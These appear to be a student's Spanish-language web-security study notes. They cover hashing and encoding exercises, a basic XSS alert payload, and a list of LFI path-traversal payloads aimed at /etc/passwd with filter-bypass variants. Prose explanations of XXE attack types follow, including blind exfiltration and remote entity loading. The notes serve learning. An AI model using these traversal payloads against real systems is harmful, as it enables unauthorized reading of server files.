Encryption hash
Generar las cuatro opciones con el "hola mundo" y compararlo con los que ya tenia:
0ad066a5d29f3f2a2a1c7c17dd082a79
459567d3bde4418b7fe302ff9809c4b0befaf7dd
0b894166d3336435c800bea36ff21b29eaa801a52f584c006c49289a0dcf6e2f
ubyn zhaqb

Tenemos 4 hola mundos y 3 hashes junto con el ultimo que es un cifrado de sustitución de letras simple que reemplaza una letra con la decimotercera letra posterior en el alfabeto latino

Encoding
Ayuntamiento de ribarroja http://www.ribarroja.es/portal.portal.action
Ayuntamiento de alboraya https://www.alboraya.es/

Base64 
aHR0cDovL3d3dy5yaWJhcnJvamEuZXMvcG9ydGFsLnBvcnRhbC5hY3Rpb24=
aHR0cHM6Ly93d3cuYWxib3JheWEuZXMv

URL Encode
http%3A%2F%2Fwww.ribarroja.es%2Fportal.portal.action
https%3A%2F%2Fwww.alboraya.es%2F

Hex Encode
687474703a2f2f7777772e7269626172726f6a612e65732f706f7274616c2e706f7274616c2e616374696f6e
68747470733a2f2f7777772e616c626f726179612e65732f

Como lanzar un cross site scripting mediante xss
-<script>alert(holaa)</script>
Son de dos minutos los videos 
https://www.youtube.com/watch?v=EWGUznyQIhE&ab_channel=VidaMRR-Programacionweb
https://www.youtube.com/watch?v=nRRZrF1eXZM&ab_channel=SEGURIDADCERO

LFI (Local File Inclusion o inclusión de archivos locales)
https://www.youtube.com/watch?v=t15Xvv6k-1U&t=267s&ab_channel=ElPing%C3%BCinodeMario

Basic LFI
?page=../../../etc/passwd
Accedemos al raiz de la ruta y desde etc buscamos el archivo passwd que contiene información sobre cuentas de usuario.

Null Byte
?page=../../../etc/passwd%00
El byte nulo al final podría hacer que el servidor interprete la ruta del archivo como "../../.. /etc/contraseña" seguido de un carácter nulo, que corta efectivamente el archivo ".php". extensión o cualquier otro carácter después del byte nulo

Double encoding
?page=%252e%252e%252fetc%252fpasswd
Es lo mismo que el primero pero con codificacion url (enseñar el ejemplo de antes)
?page=%252e%252e%252fetc%252fpasswd%00
Aqui lo mismo pero con lo del byte nulo

Path anddot truncation
?page=../../../etc/passwd............[ADD MORE]
El propósito de agregar más caracteres suele ser intentar confundir o eludir las medidas de seguridad implementadas por la aplicación web.

?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
Esta forma utiliza barras invertidas junto con puntos que nos permite representar el recorrido de un directorio

?page=../../../etc/passwd/./././././.[ADD MORE]
?page=../../../[ADD MORE]../../../../etc/passwd

Filter bypass tricks
?page=....//...//etc/passwd
En algunos sistemas, las barras diagonales consecutivas pueden tratarse como una sola barra, pero la interpretación puede variar según el servidor y el sistema operativo.
?page=..///////..////..//////etc/passwd
?page=../../../etc/passwd/./././././.[ADD MORE]
?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Utiliza codificación de URL (%5C representa una barra invertida) para cada intento de recorrido del directorio.


Explicacion XXE
XXE LFI test 
este código XML está diseñado para explotar una vulnerabilidad XXE al intentar leer el contenido del archivo "/etc/passwd". La entidad externa "xxe" se utiliza para incluir el contenido del archivo dentro del elemento "foo" en el documento XML. 
XXE blind LFI test
este payload XXE intenta leer el contenido del archivo "/etc/passwd" y extraerlo a un servidor externo haciendo una solicitud a https://www.example.com/?file:///etc/passwd

XXE Acces control bypass
Este código XML está diseñado para recuperar el contenido del recurso remoto en http://example.com/viewlog.php, codificarlo en base64 y luego colocar el resultado dentro del elemento "result" en el documento XML. Este tipo de ataque podría ser utilizado para exfiltrar información sensible o ejecutar ataques de lectura en recursos remotos.

XXE SSRF TEST
este código XML está diseñado para incluir el contenido del archivo de texto remoto ubicado en "https://www.example.com/text.txt" dentro del elemento "foo" en el documento XML. Este tipo de técnica puede ser utilizado para incorporar datos externos en documentos XML

XXE RCE
este código XML está diseñado para ejecutar el comando uname en el sistema objetivo y devolver el resultado como parte del documento XML. Este tipo de ataque XXE es peligroso, ya que permite la ejecución de comandos arbitrarios en el servidor afectado y puede revelar información sensible sobre el sistema.

XXE XXE DOS LOCAL
Este fragmento de código XML representa un tipo de ataque conocido como "Billion Laughs" o "XML Bomb"
Este tipo de ataque puede agotar los recursos del sistema al intentar procesar un documento XML muy grande, lo que lleva a una denegación de servicio (DoS).

XXE XXE DOS REMOTE
El fragmento de código XML que has proporcionado incluye una entidad externa que se carga desde una ubicación remota
Este código XML carga el contenido de la entidad externa "test" desde la URL "https://example.com/entity1.xml" y lo incorpora en el documento XML. Es importante destacar que cargar entidades externas desde ubicaciones remotas puede tener riesgos de seguridad, ya que puede exponer el sistema a ataques como la Inyección de Entidades Externas (XXE) si no se maneja adecuadamente

XXE UTF-7
El fragmento de código XML que has proporcionado está tratando de realizar un ataque de Inyección de Entidades Externas XML (XXE) mediante el uso de la codificación UTF-7.
En resumen, este código XML está diseñado para aprovechar una posible vulnerabilidad XXE en un sistema que interpreta XML con codificación UTF-7. El ataque intenta cargar una entidad externa desde la URL "http://hack-r.be:1337".